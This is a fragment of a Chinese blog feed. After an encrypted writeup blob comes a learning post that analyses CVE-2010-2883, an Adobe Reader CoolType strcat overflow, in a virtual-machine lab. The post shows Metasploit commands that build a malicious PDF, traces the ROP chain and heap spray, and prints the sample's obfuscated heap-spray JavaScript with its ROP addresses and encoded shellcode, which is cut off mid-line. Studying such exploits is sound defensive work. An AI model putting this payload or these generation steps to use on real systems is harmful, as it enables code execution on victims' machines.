fad1c122efabd765f99a368833336b6e52a48d6494d600eb5083fcae3fe2dffb325e1606749745ad2e686e1aa224cd63fc9faa92c29bcc44c47dc87bb18dde95146f01f78d90846ea1f368e351aad089fa24d3c4d511d87c62b333249ebea0cc42366d2e1472bad35eec0ba1dfb4ca9bfadc7f9086977d1b8218ced7b2c05baa6262b8ccb5e261857596bc7164742e102f4d3fd811bef8faa8d4750fa1d4147c3df7f250e0c58adf76788168ac9662a4aba23d3e411ad2284a4da60c91255c0875e03c6c023726f518a551b842ec701047c543261b338135d2692a5cc6e5db2d629a3af6cb812e43ea563f5a3584e1b6f2c9e380693a8da048db281179b7cd2c7cbd1416cac9f9ba6b318c9282473a9db88b5171a56456879c6cd4032737e52b76cf6d1b7623bf704e3620d470dbdedb1b97092fdbaf90b325f0c337824274a07b08c699257a89ad8c580729d2b63b863ef7b795ad2a24f89c9df97d9308cdce87f2247bc1170727c73a80cc032685586f8b3c66480ef8d8ed31ee2cfdbab62009629aa4c2d89cf507b5feb04839fff1ac46e81fad1f8bfbbfa6fb4a234d290f8a0d4e65e7a5df8a458d5c0c165bea7bbb064265b8304b79ecd9bed7100d27794f18d0445a98477745e4a05e77da88823e31a07dc355c2587e5352ec555deac0458027366e0e1e13b533ca200b98f7529b489b6c0d9bc1f409070b5c4fd9ec85225f610fbf94f2a3c14c786436abe85c68a942db4837df8935efff1a114a5c9d969b99b275cf15726daea191f24d77a7b24937ffd0c95ae9e80a5339304a8c101fe659d3760c5a418e6679aa80fae8fa76f145d77f474e4029f5fe9b6c91c235957d877cb116e81ed02fbdf617a27f5b0d77dd9eb8d95702f55cfc55ef5bc6c293ca78def01a83728cefa6d32fcf0756ec1975c7d8ebc661812f4e94df8ed8d6736f52935386561a4ca5b0b7937dcf7fe9e9861d298e7480d26b7444f5fcf6e7043287723ea2c4b2937a77e51f2327127c139f5153aff1f389493f205150f8e4abb304883818e2a90228a523691155b3e8d1dffd8dd0327639ed303a3256cae4bb6105825ce1f91cd4c3f933fd439c0ccfd6c111349f4e9cda9894c232193c15d4a73a151656bb5edbc9b48a5c07b3b7e7c7078c96af333edc63c85039e2904309bdbbbf2e367ab39865d6f89b53a3f2b0a557f78e96afff3496b5c25c43ad10e49bd17edab2f5bb1c41b5e56b4eb1d2c399fa222dad00f351b1caac357cf3a3ded8a4c56636b88bfd5bb04bd8b93353754f45f283d9128fad630867cfc93bf61d734ca146db3bd9375147a0a784980583ea0d6d3ba0159cf7a47eef06c393adbbce18d8e5d83c3964f92d3c016d721fed5d5fd35c3600d13c7ecd0b52dd3a7f096a5b63b01d96b6932affab5b4853922794f87613aed0f10960316aeb4dac6c5102ff4ea1128b80b4b2266afc7c46b97b4337ae9abb34b8f3c949446857093ff7177138a9b031b37c3f17d5ddcb8a078eaa490946db427568c26c38773f7cb44ecae771f7533cddf3ba197e3aa5b4de99746c611e5842e8dfeb931737e8c680b9e9dc415f938f80e99de393f550701916b4d70913ae4fa7bb1281432637177c02a72c96a43075eb9048892e7f6e15c7ebfa9e1b9f3b198b63e69e0cd1dd74fd5106f9a161b6237c56ffdeef8180c8836e788f39b8434945076c7845667ccf59b93f9644bea892dfc8685d85f24077514b31e4bad3ff950150585ea0534330ab7a3e1a871d22104ca7a789f76799632c11f81ad6649de2d1c309818deaa6a91aa666868cb010ee42d6ffd6e4553002d10608530c10e96d2bb1c262dbe7bab45acd7fa292ec2535566ed814f30fb4343597666bd22f869cb05fbf7f2a414913d46803371b9b468390bc94e970609c21be5bcc9249f1754f12b71e6b84706220599f0e7b0010568ce7ff062d8cf0e254fb73b4fe7f7b9ce777ed39abe4ec23c9cb786816a891a39a8ce7c9ea0e54207fa16e7227cb9c32deda1e2ba6208f594f453143aa0f729d730f1196488f77268340b138a481ba8fa08683c45f85074bdc0355604af160032b6995a19eb1d39bf60686f2d187b2464cc7e10505164545459a36c41b267954dc7a84c21872e4bae78407c64074fcee8f7055981eb9b9656b711311b02a0421005b29ae564e295815626db507ff299571c7e53fa6d4fc77de43219325eee71e64701297e60d0e3ac414aaa8ba7567460ad3a5ffef91e0386d024546b950dbedcd83eff3350ab0929350337e51f25ae4d936b44a30e77bfede956fc50032ae132d5e48cba850449024462e0cf88f299fd858401b74bb289dc696b9d7b152c14f618a8a05918b4e62f8950248003854253a5d0f2d5eb57be7bef09419cb273432752e0ee65204cf2cdb33f921cf533f06a97d6959bc4b451d6b9456e16b8f11768e1493979cd5d3f0bb81f2e5fac00f5e6a7ea1795e98025cb29de0d801c37ccdfc1a7e8a1db28aa4b5a685433bb31bd3d8b194d6b42283889dde647bd78ca120371b8ba0cb69f96cd8a7a5e5213fec0b826aa941ca748b0b789784475a4a429cd8c35ee23668aae978a3e969c4e0a9737d041cd13f9e984f41709c4a6e99229bdd2eaf883023fff65a06579f0342f071526adbb25309d04cc42b7e319eec3332a06417507c56bd31d81854ca5595d26c488e87b274a61ba4a7a0a75b5a0a890c9bafe6453521238bd015c1b24bdd07add2f90e53fc8c14b3cd8737175b9989f53b5a3408a6880950b36e8cfd313b2d9da8c2a9f2b5a41967d24d626aa94b5b4d4d8d8938ba7e1770b4967f7057ac137a2aea25d77c80eda9b105f8f6bc08e8309a19534111291bc7ee63f8191ffdd9ee9aab8da0d2b28660b5aaeb46b3496703f740abf486fb3849ccca2067c7b00a7e573edac48ead2eaf2664f67d74a085c88db4f5827be9a0fbfa017a7ae3bf724676ad2298c1b92ad2ae33aa60adf32d0a8eefee9ebf412c2c1817129ec5efca7a43f2122497338bdeebe4c591153098de51fe31f05f3d0701425483a4dd002733838ca31f1ce849008eccff42c6c6040354879e4c60416e025809a51aac9c60d97830e6513645af59cad6a7f8d4e0e342db9fcb34017db7c1207abfdacf8a0eefe02bb2d1f364f640ac5bd819626277c05911239e9553a87d0f42e26c59adfd00553b256b13db93f0ffb94cfb8e40267542bc4fdac08c068c00cec495148e6cb2abf38efa2f4651bace6b3e34ffbb42638396b9d0c12e4050e5e609d42f5df6ddeda0fc817b937decfff3d2b4aaca27fb5a3ee15e86bc4b90f48b685b301835023e305231c77aaf484f5ecafdd00e478d74fefbb7d870454f590f79bc773b907a150ce8300456d686d6c4bbeacca9ca4a1e465055f5d58e7fe2c3068833eea17913a9470323f3e92a8274d0798362e9cd93a6c2a8cdf4c89d54088ff7492603f45e5e1ceb05dec828e9868d747e037156a50805c81be169ee4834c4553fdac6d0b966e8548c47bed5278fe751721ba814e345117d7e18ecc05000d2bb0728700233df8d13f959f86db882a2ad43f463bbfe23b704da5f1284289c7bc4b485bc418bfb8d5d7bf3ff34fc3dacfc7c25f050ee44d8219728e00cef9f3882c9f6377ec2ea209c0826d865140b40ff4a88b9cbb739578ce128fbc067b76a234bd9884fea032629d4b546a4241b127a86ccd01b8261e6f454159b36404cd5fb5969f5fd7963a7b4ff2d434c83e21aaee372cb5320e886f27b2eee24808def4bd2b3673ae2435b74057906a8d258cdc695a2e0c34a0119f97bd8ddb870118a3344f47222a299e40bebcec4eb90b0666f7c05db12b0279f52435683f47ca1016c76b1597c46ff964970b84fb5c2c1f087146fab22ed101238f5f13e71cc67c21f35627c227ee5e389a3fe86fe278a45934e688acb59eb1c1c2e077b3bd0290b4b5c1c875f1cb21b713ef084d4bcf6406ff037f753febe0af559a4d7bc7c72da22e04533b9ad309c6ea355225516b1811adbd3660f8aa6276046f21367a608039fdbd8ba6c5c5c2db4bedd899d93902bdfae32b94ccf7fcd2f0f4c091513868124fcea173722438c67dcaa447d0fb8bbb8c4e9f87f1f6e8e1b456c37f8f382d645f1a1d5e9cf4c520eca198b6276c6a58d71dcc1e4d0be7af488e938332d30b970932f542f152c2161f4c1bd0c1954d41a5da6d2f752c98ee0e3050fcc5e21a7460c06670fe312d01ce3a36f1f3d66a7fa65d1cf4851b1e3609414e20240a73063b8e8ca5465f37b7517ac90a2d8bcbd9054442ec91ad815b5c8e6cd0c31538293de3f15c4aa727d1c8e2db59331b35c03e27146855925646ccbbdaf4a62096f7f16682961282701b6690cb01d687a8b5a0746572ef797d2e305710f4cb12f2363f8f12ed75dc53b4794761c3d534c69139ce02c9129c977452f0552ce29ec84ef19976173212b5c9fed110a9b0385815611985e7425831d9042d22dde0241f695605e50ce760e8dd8abdb310c964ea3028aa91c00f34cec1dd13615e30a9124af331d9a879ce02fffbf6f5fc033726a6cd936ac69c3810a1c80bd3ef50ee71b7efbca7e57cd7722ae90847589e025d7fdc370e7b7e1d5d6428c4de994af3db1e53bb4790c982cfcdc47163b99bae64e1f6f36966265faf82c9952dbbf05c7d2609ca0c9b806d38dd3c4ef5271aacc413f0ae33815fa7b0a8cbe3c96ae676cd8042e9f4aa1234f76b626825c39971fcc9b0e2d9dca29850a0da83bf71813a56316f9a6cbd09fe72f9233153ec5498ff81be64bd33e7b91b07092a36ec2a2425e569ebe1a93639b1c29854fb51c6e50a772b13529da0486bbdfb8be5584f4022b314c3eba22cdb579cfbab173f884491d169b2e3a4a904107cceaee98dbb1076f6fd977cb890add009fb6265ef4cd1ec0334cda1db2903b574070b83b6b5c1c30eaf8cc041a00d2ec2a047e34d9d1e6a38292d358b53a3fe84a1c45421f724fed882bc8c41351298cd9bfb3459f11f9f4e101fb811e4e650a949cc67ecdded87c37d69f362ddbe1b2da2004a2281108db2e73d15629b01081c7f6f25623375da2758d99e057625321d508ff76b00a4d795fc67a4fd6eae4768ce56c8c39cb8d933b34bd10e496141b7d60373f57566102d2e1bf50683e52bd93aab15437dba1854dbe976ddf9d98ccedd24b9da0ab1cf64fe8d50db8d228da75cf54802b233370ae1bcea23b42cf0fb9588608899531493feb88322d07a217f30294c649472d439935204235d4e08f167373883827296a31daeedd10a1cc7906f9ffb0f64a72a49475a6ba07010eecaa091e5e5632aa2f780599351185b4ced1a227bd648e320d6382058e527c23863db2f37fb73d2166cc330c283df474a327ac932ae6404e35143ec99a0ddbb63eb32b725af6c607cc7182cb409242313f3d33f536dec0c27743aee709fec9180196dd65a38d27731a6f354794f57dfa2c6a533394320f86cb31a4e7cb572a0c345fefbb3dd0e7a23daa45ebd5ead4f369671428ab577d2f25b2e52b7e03f8a9f696e3b0092f8849beed7783d4e2db6f2207aea6cd5b091bb96935255352ef247e90a077ce17c5d3e471a072e6c93f4cb75129ad8290da907ec04341546a9cbd6b67768bb23d8bfc34799d8cc9bc94e405ed34024d38e12eb04295ec00d6421cdda4dfd7310f7ebb2cc13846c8c0601cdbe0cb6f2d9662b43dcb23c35f51f15ef7ba02b79117ba3a8061e3c70d8bb0e5e0074530c4198ff8bcf509a3b0ed508529ab7643221157e57352dd04f2103c07bce822f34c8af25d6135835bef9aa53e2d0d043f0740db4a5b6dea481f0ef6137ff2abaf1b2c7e51d942b23283182960b241f78be4be358ae447446b07a56019fce868615622f3b7c0707876d3327a22d4957bb8565c3ea9b928a9f08dac1046f86e5f3249eb07f29d689fe3c3e73306c17e6696044b1b4d3a90126c53345526a122020bb629da7cf27e65b01da3fe4942d660a3d9d20b699eafdd6d9d78a9c6e26e5c8af27ede28155b69ae8be10b62a642e7c982c1f9cdaabd1116756b1da82780def64f944e839f16cbe82db59b6e13b1e374f15d4fdad8c2fedb48cec40ef9c769aa2bbeeb5caedc7bb2c95040d8a4a01fc28df98f90a472efd3ee59cc94c2e0a75f7c35b006c00ba45acceb883086773e6eb64d644dcfa8bc2ace43b8b56d2759d48918cfd598ddb713f3f462fef7a59e7061d14039c4de69fa04fd6c410c9b3d0d1e1bb1cdd58c2ef38978f1a5428ba87604981b343efd97083167e3aebdbaf72d3c2eb826da6a030bfbec71cf60294ee2fae2edd096116a5bdc08183d795f34ccce914010d51befefd4ff75f6189ea6964c05c77489d718c4d122c66be0cf3ed895a33499bc3e23557eb4ca50e9b4026e49ccf0cec3bb41df7af4489de889762b9d1e05e45cb9cb25dabf6e8eff4482f84a41e9ee7137e3a7bcac7fdf21fbec93fe81b02af7a5766e3de56b6ca77cfbbf8e2c9eae8783b21a7f789245a1cab0a3fce132dbfedca78629ef315e5a4d5ccad4e64101edf26452f4d510295a6a77af4ad7e8779e8328f47d087b70d42a3ef9ac79e723a764e07298bae749c6aa9c4ce8439f2e9f1f50e88fb375ae84fe2fbd9c4a54e77dd8d48d05883313468787c8fb42c86eeba27b40139e5f7291e23d55e4d16795d1dc12799497d4612df25ff8d617923368800d3127faf8eb1e9b937c59915800d66fd8e4a65f95028f15ea193350d4a15d20224ced968ac68e135eed58e2df6a87c283fa832f2ff031f005fac1982359dc79f207b12316617b619631944ed4d033e1f82b975433c9a3e51790de5c02ecf328d4d55c07a4bd616278336addbdabd32c7beef1e9ce4708f90ff6ef28f8d761fbfb61cb509ce6a1be9db0d360e99ec0e29749f1f831027b75ce58ef73cd98097e33e3b71337e275a119d1016723d28d99be572fbd9eb5168879fb48d51260bec59bfe34290cdb883e7bea1f803e3b8302c37c23e1f733525a0e8b3f8496e0fe96f2d39b739ed919a80bd471cccdda794ff6a7efef8938dbbb3359a9c603d43c02b5f4809aecbecc5ef8f8d25769889af53b47f2aa316d070d808278f6fc40c0134b9ca5805405a41d2b548f0aa268394787355915be24d70e81df49be0a5a4b43e9084b0e7d1ad0594a588811e31342737d3a139de75142e7f72ae6f2f988479af9b86c5d8322c63e4b554bb4be7f78665e9cc53e2b33552f39fe03d1b1a3573cf39821bbb7d89e9b39fd8522f664efc044704add82cbc48dde7dc38a13041f9366c0fc868a0cda1af99922072ae3bd9e21e1435deb4fb8a8e921f99169d2e34e312c8cc208ab6b0b70a70331a3addfc6c62256c10163b65569bf9eb334635790361a5f1e4a05bf2d5150b08c19b7646816959be9fc531cbf381c77d0003756decf7444a471f29496437486d706dbef3eccf3cc3d5e833ad5826268233356772874912da199f40fca8fa1be806fff3b48c50a0e02ff8023be4f50505ce96afd0dea92baebc75d4ec58e3efc6166bdcb97b25ffa94425a945fad5adc0257077f796f1bad6738963d1c9f5b58a79395c749a957c28d0d175f0659510e319d01f29fc987b731c679875d8f531552b4adf4d347ad2f3a2742abac48df4378afbbdc73812423002770c917674398a1242ebbe352af67e000229c41566c695f50b2c3fc88ae124f8901e8ba51eb9eb06fd889fc3f1a11a56ae0324d1e521b9e6caf16d1e4f0307e2fc6bb9bdefd01765a2fd89bd72836b53df4be6a86efe8387cde124ab6e33a88daf803f95442a42df13ed8266d7a340cb2f133685eea7225534ff6825846fc85b1c286cc3d67e57ee2a980471d6ff51574b496ab9cfb35d6e143eb0dbd7befca5f294b8eb5aa84d1741e93d6ca3fce2fe08dc20746f2633e2e38e9f5c5e822b689a48dbf54ec67c5afd55d66b2f36bc79aa2b28db03a1d526f1ce99b20f5baf60c33d337d22dd6832bb9c0029e089f48721617cee7430b235acef1cc6b4e1433fa396c726233e1b49a2cd353a44c7aa4df759c3fff71e26eac5ad0dec7cc6a097ebc18c9603423ed5b4b639a6544b6fe5702fd06eee7b29ab9ca3acf19994842b5a2092e94c93389074683e31353356269c4c4443a016e188c037dd1e474bfe249c0f46e5270a7d9dbf554885402e4d4abf22eaf638c00aad1ea744373253cbcb8aecd7fbce4c154fffc9d38662132a4212c80117d94ed846c4dd6bf8174c8b476737482434c17dfc362e946146570f161560bfb33fadb3a16c95e0cc8e80e2f37a3e42e91fe455a668950062d817c0139c2335ec886f2053f588308c19024d98e739c11df4781378e114e5256b39fcd6954f5208fe24ad7c95d7b02c2e4fe4451a03dd82c8e0c4f57771699d93f871d9bcf28b1c0613f835fbdf5db51d5fcaecf4402cd84e40321a70f335b0bc1519a7d744a43a8e0c8b5133ff2e0c178362bb71efd5d6a9a4c6df7c82ae929fa515834412cf44d9a208911adf2734a4071409f5af8af2b0444be9cf6a8cee6783c8f908700b457b01b6d212527ed9a0d1ff29fda5e65ef612e8a833e63c57a48a87d2430a789710c358385a90030b09b9a3801c0279bb7f78068977aec508c1269d2e565640ea762d672ec1925ca4881d2f42c6a48b489ed5e9d23fc2d9f4f0b4109952225a8d13ca82d2afe784c863f2c025bd0fa6459d84cfde11dcaec4f1f5f6cd7db7d2763f36db6539f806479085047be18eb53572826fa75925d998470a6db9f6e24161deac01b1afaaa5c91aedae88f13b23ccdaeca57d9aa04d102bab47e198a6a4e752be38c66ef7d7dc46ac18338f5c2a7ae50eeab5be9dbaf48ba5b40843c262ab1fa74cc</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>二进制,pwn,逆向,writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>漏洞分析学习之cve-2010-2883</title>
    <url>/posts/78c3679c/</url>
    <content><![CDATA[<h1 id="漏洞分析学习之cve-2010-2883"><a href="#漏洞分析学习之cve-2010-2883" class="headerlink" title="漏洞分析学习之cve-2010-2883"></a>漏洞分析学习之cve-2010-2883</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>打ctf打久了，也该学学漏洞分析了，不可能以后的工作就是打ctf吧，照着漏洞战争这本书开始学习吧</p><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25iZXRhLmNvbS9hcnRpY2xlcy90ZWNoLzEwMjAxMC5odG0=" title="https://www.cnbeta.com/articles/tech/102010.htm">adobe_reader_9.0_download<i class="fa fa-external-link"></i></span></p><p><span class="exturl" data-url="aHR0cHM6Ly9tc2RuLml0ZWxseW91LmNuLw==" title="https://msdn.itellyou.cn/">win_xp_sp3<i class="fa fa-external-link"></i></span></p><p>vmware 自己下吧</p><p>工具：</p><ul><li>吾爱破解od</li><li>010editor</li><li>PdfStreamDumper</li></ul><a id="more"></a><!-- build time:Sat Dec 28 2019 22:32:14 GMT+0800 (China Standard Time) --><p>配好环境后 开始动工</p><h2 id="样本生成"><a href="#样本生成" class="headerlink" title="样本生成"></a>样本生成</h2><p>先生成一个弹calc的吧</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">search adobe_cooltype_sing</span><br><span class="line">use exploit/windows/fileformat/adobe_cooltype_sing/</span><br><span class="line"><span class="built_in">set</span> PAYLOAD windows/<span class="built_in">exec</span></span><br><span class="line"><span class="built_in">set</span> CMD calc.exe</span><br><span class="line">show option</span><br><span class="line"><span class="built_in">set</span> FILENAME cve2010.pdf</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>放到虚拟机</p><p>运行起来</p><p><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/img/20191114095940.png" alt></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="漏洞点查找"><a href="#漏洞点查找" class="headerlink" title="漏洞点查找"></a>漏洞点查找</h3><p>如果让我审一个软件的话，这太难了。。光敏感函数都可能有好多吧，比如这里就是strcat，<br>这个strcat是个敏感函数，让我纯手动审出这个点，我觉得对于现在的我来说不现实，所以，漏洞点这部分直接过了吧，假设已知漏洞点，利用吧</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>玩惯了ctf, 通常pwn题就是给个exp就可以一把梭，编写exp也是门艺术，那是python语言，现在这个要产生exp,emm，就是用msf这个框架了，我们要生成一个pdf,方便我们利用，所以开始我们的学习旅程吧，学ruby,学js</p><p>发觉从头开始构造太难了，直接分析部分代码吧，我看了下pdf构造部分。。好麻烦，所以应该抽丝剥茧，将pdf构造和原理部分分开，</p><p>我这边只分析下ROP链过程，因为我只会这部分，pdf构造还不会</p><p>至于pdf部分，还是用现成的吧。。还要看官方文档来构造</p><h4 id="ROP链"><a href="#ROP链" class="headerlink" title="ROP链"></a>ROP链</h4><p>用ida打开CoolType.dll库(这个库在adobe_reader目录下)，搜索SING，定位到这个函数，看到strcat，盲猜也是这里有问题了，</p><p><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/img/20191114100102.png" alt></p><p>其余具体漏洞战争那本书已经讲了，照着样本分析部分做一遍</p><p>010editor可以设置模板解析文件，网上下个模板就行<br><span class="exturl" data-url="aHR0cHM6Ly93d3cuMjE5Lm1lL3Bvc3RzLzI4NTUuaHRtbA==" title="https://www.219.me/posts/2855.html">下载地址<i class="fa fa-external-link"></i></span></p><p><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/img/20191114100712.png" alt></p><p>dump出结构数据，查看SING部分</p><p>根据ida那里获得的地址下断，<br><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/img/20191114101405.png" alt></p><p>断在这里，</p><p><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/img/20191114101443.png" alt></p><p>看strcat部分，是将恶意数据复制到ebp所指地点</p><p>继续f8单步，单步到这里执行直接弹计算器了，下断再次运行，这里如果弹到7C地址处，可以按减号回退到地址处<br>0803DDA8 E8 E98DFDFF call CoolType.08016B96</p><p>再次运行在<br>08016C0E E8 C64E0000 call CoolType.0801BAD9<br>这里跑起来了，继续重复<br>0801BAF9 FF10 call dword ptr ds:[eax] ; CoolType.0808AFCE</p><p>再次重复</p><p>最后定位到这里<br>0808B1C0 FF10 call dword ptr ds:[eax] ; icucnv36.4A80CB38</p><p>F7进去<br>4A80CB38 81C5 94070000 add ebp,0x794<br>4A80CB3E |. C9 leave<br>4A80CB3F . C3 retn</p><p>发觉进行了栈底的提高，<br><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/img/20191114103926.png" alt></p><p>发觉这个栈迁移到我们原来写入的地方了<br><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/img/20191114102632.png" alt></p><p>也就是说我们控制了eip,从图中还可以看出，这是c++的虚表攻击，覆盖了虚表指针，让他跳转到这里，然后进行了栈迁移<br><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/img/20191114104211.png" alt></p><p>这里在将栈迁移到0x0C0C0C0C部分，很容易联想到heap spray,大概就是将eip转到对去的0x0C0C0C0C部分，然后用js申请大量堆内存，并且包含着slide(滑板)和shellcode的内存片,申请的内存超过200M就可以大于0x0C0C0C0C,然后通过滑板对shellcode无影响，提高shellcode命中执行率</p><p>后面继续执行创建临时文件</p><p><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/img/20191114104803.png" alt></p><p>└──╼ $strings icucnv36.dll|grep iso<br>iso-ir-165<br>iso88591<br>iso2022</p><p><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/img/20191114205019.png" alt></p><p>这里从库中存的取出任意都行，不一定得iso这个，不过可能这个好找？<br>然后执行函数，参数都放栈里了</p><p>后面的函数同理可得</p><p>创建CreateFileMap<br><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/img/20191114104818.png" alt></p><p>接着MapViewOfFile<br><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/img/20191114105311.png" alt></p><p>在接下去memcpy<br><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/img/20191114105328.png" alt></p><p>然后是shellcode<br><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/img/20191114105353.png" alt></p><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NvZnRuL2FydGljbGUvZGV0YWlscy81MTc0MDM1MQ==" title="https://blog.csdn.net/softn/article/details/51740351">映射部分<i class="fa fa-external-link"></i></span></p><p>createfilemapping 用来建立内存映象文件，原型如下：<br>HANDLE CreateFileMapping(<br>HANDLE hFile, //文件句柄<br>LPSECURITY_ATTRIBUTES lpFileMappingAttributes, // 可选安全属性<br>DWORD flProtect, // 映象文件保护方式<br>DWORD dwMaximumSizeHigh, // 映象文件区域的底值<br>DWORD dwMaximumSizeLow, // 映象文件区域的顶值<br>LPCTSTR lpName // 映象文件的名字 );</p><p>mapviewoffile用来访问映象文件，该函数会返回一个指向共享内存块的特定指针。原型如下：<br>LPVOID MapViewOfFile(<br>HANDLE hFileMappingObject, // 映象文件句柄<br>DWORD dwDesiredAccess, // 访问方式<br>DWORD dwFileOffsetHigh, // 映象文件区域的底值<br>DWORD dwFileOffsetLow, // 映象文件区域的顶值<br>DWORD dwNumberOfBytesToMap // 映射字节数 );<br>其中如果 dwNumberOfBytesToMap 是0，表示映射整个文件。</p><p>然后在复制shellcode</p><p>整个攻击流程就是通过strcat溢出，攻击虚表指针，然后通过ROP，移动到我们的栈位置，在通过栈迁移，移动到0x0C0C0C0C部分(联想到堆喷射)，在接着就是通过ROP执行shellcode，整体流程就是这样<br>动态复现部分就是这样</p><h4 id="heap-spray"><a href="#heap-spray" class="headerlink" title="heap spray"></a>heap spray</h4><p>通过PdfStreamDumper dump出js数据</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> kQaZHCkIwASUmfcZmiIDLaVOqfgXDNAZipbOhbFhZFgjkCy = <span class="built_in">unescape</span>;</span><br><span class="line"><span class="keyword">var</span> xzZCr = kQaZHCkIwASUmfcZmiIDLaVOqfgXDNAZipbOhbFhZFgjkCy( <span class="string">'%u4141%u4141%u63a5%u4a80%u0000%u4a8a%u2196%u4a80%u1f90%u4a80%u903c%u4a84%ub692%u4a80%u1064%u4a80%u22c8%u4a85%u0000%u1000%u0000%u0000%u0000%u0000%u0002%u0000%u0102%u0000%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9038%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u0000%u0001%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9030%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0022%u0000%u0000%u0000%u0000%u0000%u0000%u0001%u63a5%u4a80%u0004%u4a8a%u2196%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0030%u0000%ua8a6%u4a80%u1f90%u4a80%u0004%u4a8a%ua7d8%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0020%u0000%ua8a6%u4a80%u63a5%u4a80%u1064%u4a80%uaedc%u4a80%u1f90%u4a80%u0034%u0000%ud585%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u000a%u0000%ua8a6%u4a80%u1f90%u4a80%u9170%u4a84%ub692%u4a80%uffff%uffff%uffff%uffff%uffff%uffff%u1000%u0000%ud0d9%u74d9%uf424%u295b%ub1c9%ub831%ucdd3%ub89c%u4331%u0318%u1843%uc383%u2fd7%u4469%u2d3f%ub592%u52bf%u501a%u528e%u1078%u62a0%u740a%u084c%u6d5e%u7cc7%u8277%uca60%uada1%u6771%uac91%u7af1%u0ec6%ub4c8%u4e1b%ua80d%u02d6%ua6c6%ub345%uf263%u3855%u123f%uddde%u15f7%u73cf%u4f8c%u72cf%ue441%u6d46%uc186%u0611%ubd7c%ucea3%u3e4d%u2f0f%ucd62%u7751%u2e44%u8124%ud3b7%u563f%u0fca%u4db5%udb6c%uaa6d%u088d%u39eb%ue581%u657f%uf885%u1dac%u71b1%uf253%uc130%ud670%u9119%u4f19%u74c7%u8f25%u29a8%udb83%u3d44%u81be%uc002%ubc4c%uc260%ubf4e%uabd4%u347f%uacbb%u9f7f%u43f8%u82ca%ucba8%u5693%u91e9%u8d23%uac2d%u24a7%u4bcd%u4cb7%u10c8%ubc7f%u09a0%uc2ea%u2917%ua13f%ub9f6%u08a3%u399d%u5541'</span> );</span><br><span class="line"><span class="keyword">var</span> PtsP = kQaZHCkIwASUmfcZmiIDLaVOqfgXDNAZipbOhbFhZFgjkCy( <span class="string">"%"</span> + <span class="string">"u"</span> + <span class="string">"0"</span> + <span class="string">"c"</span> + <span class="string">"0"</span> + <span class="string">"c"</span> + <span class="string">"%u"</span> + <span class="string">"0"</span> + <span class="string">"c"</span> + <span class="string">"0"</span> + <span class="string">"c"</span> );</span><br><span class="line"><span class="keyword">while</span> (PtsP.length + <span class="number">20</span> + <span class="number">8</span> &lt; <span class="number">65536</span>) PtsP+=PtsP;</span><br><span class="line">QWajrmiLzGfVTTfDMfHcozfKkXRjoAukOXIOVDKdRSnuHrXJWS = PtsP.substring(<span class="number">0</span>, (<span class="number">0x0c0c</span><span class="number">-0x24</span>)/<span class="number">2</span>);</span><br><span class="line">QWajrmiLzGfVTTfDMfHcozfKkXRjoAukOXIOVDKdRSnuHrXJWS += xzZCr;</span><br><span class="line">QWajrmiLzGfVTTfDMfHcozfKkXRjoAukOXIOVDKdRSnuHrXJWS += PtsP;</span><br><span class="line">LuOTxdQUPktiTIzXByoIFePyCFwmjoenrmzexhdpiFlxvgiF = QWajrmiLzGfVTTfDMfHcozfKkXRjoAukOXIOVDKdRSnuHrXJWS.substring(<span class="number">0</span>, <span class="number">65536</span>/<span class="number">2</span>);</span><br><span class="line"><span class="keyword">while</span>(LuOTxdQUPktiTIzXByoIFePyCFwmjoenrmzexhdpiFlxvgiF.length &lt; <span class="number">0x80000</span>) LuOTxdQUPktiTIzXByoIFePyCFwmjoenrmzexhdpiFlxvgiF += LuOTxdQUPktiTIzXByoIFePyCFwmjoenrmzexhdpiFlxvgiF;</span><br><span class="line">vYpKSywUKtOzmIcaRAYPqZsGKRQBZeikke = LuOTxdQUPktiTIzXByoIFePyCFwmjoenrmzexhdpiFlxvgiF.substring(<span class="number">0</span>, <span class="number">0x80000</span> - (<span class="number">0x1020</span><span class="number">-0x08</span>) / <span class="number">2</span>);</span><br><span class="line"><span class="keyword">var</span> kXBj = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line"><span class="keyword">for</span> (bMcIMXywogQMkNripedDmONNHXvwXPnOMatnpKwUSHuATHOcAzuvTnYIGldzmu=<span 